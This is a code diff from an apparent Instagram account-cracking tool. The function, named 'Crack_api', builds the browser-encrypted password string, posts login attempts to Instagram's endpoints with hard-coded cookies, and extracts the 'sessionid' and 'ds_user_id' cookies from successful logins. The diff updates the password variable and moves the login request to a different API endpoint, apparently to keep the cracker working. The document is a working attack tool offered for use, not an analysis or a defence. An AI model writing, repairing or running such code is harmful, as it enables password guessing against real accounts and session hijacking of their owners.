@@ -788,7 +788,7 @@ def Crack_api(username, kontol):
             response = session.get('https://www.instagram.com/accounts/login/')
             csrftoken = response.cookies.get('csrftoken')
             time_now = int(datetime.now().timestamp())
-            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
+            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}"
             cookies = {
             'csrftoken': csrftoken,
             'datr': '0_2JaizKKK8UnKjOd1Xq9I8W',
@@ -905,7 +905,7 @@ def Crack_api(username, kontol):
         'doc_id': '9807605492696448',
         'fb_api_analytics_tags': '["qpl_active_flow_ids=516759801"]'
     }
-            response = ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, timeout=30)
+            response = ses.post('https://www.instagram.com/api/graphql', cookies=cookies, headers=headers, data=data)
             wanted = ["ds_user_id", "sessionid"]
             all_cookies = ses.cookies.get_dict()
             extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
